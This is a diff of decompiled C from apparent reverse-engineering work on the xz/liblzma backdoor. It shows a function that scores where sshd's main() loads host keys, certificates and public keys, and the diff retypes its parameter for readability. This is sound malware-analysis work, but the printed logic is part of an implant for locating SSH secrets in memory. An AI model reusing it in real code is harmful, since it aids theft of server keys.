@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103910_sshd_score_sensitive_data_candidate_in_main.c
 // Function: sshd_score_sensitive_data_candidate_in_main @ 0x103910
 // Calling convention: __stdcall
-// Prototype: int __stdcall sshd_score_sensitive_data_candidate_in_main(void * sensitive_data, elf_info_t * elf, string_references_t * refs)
+// Prototype: int __stdcall sshd_score_sensitive_data_candidate_in_main(sensitive_data * sensitive_data, elf_info_t * elf, string_references_t * refs)
 
 
 /*
@@ -11,7 +11,7 @@
 #include "xzre_types.h"
 
 int sshd_score_sensitive_data_candidate_in_main
-              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)
+              (sensitive_data *sensitive_data,elf_info_t *elf,string_references_t *refs)
 
 {
   u8 *code_start;
@@ -32,10 +32,10 @@ int sshd_score_sensitive_data_candidate_in_main
     host_keys_hit = find_riprel_ptr_lea_or_mov_load(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
     // AutoDoc: Count a hit when `main()` materialises `&sensitive_data->host_certificates` (+0x10).
     host_certificates_hit = find_riprel_ptr_lea_or_mov_load
-                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
+                      (code_start,code_end,(dasm_ctx_t *)0x0,&sensitive_data->host_certificates);
     // AutoDoc: Count a hit when `main()` materialises `&sensitive_data->host_pubkeys` (+8).
     host_pubkeys_hit = find_riprel_ptr_lea_or_mov_load
-                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 8));
+                      (code_start,code_end,(dasm_ctx_t *)0x0,&sensitive_data->host_pubkeys);
     // AutoDoc: Sum the three boolean hits into the 0-3 score that later feeds the aggregate heuristic.
     score = (((uint)(host_keys_hit != FALSE) - (uint)(host_certificates_hit == FALSE)) + 2) - (uint)(host_pubkeys_hit == FALSE);
   }
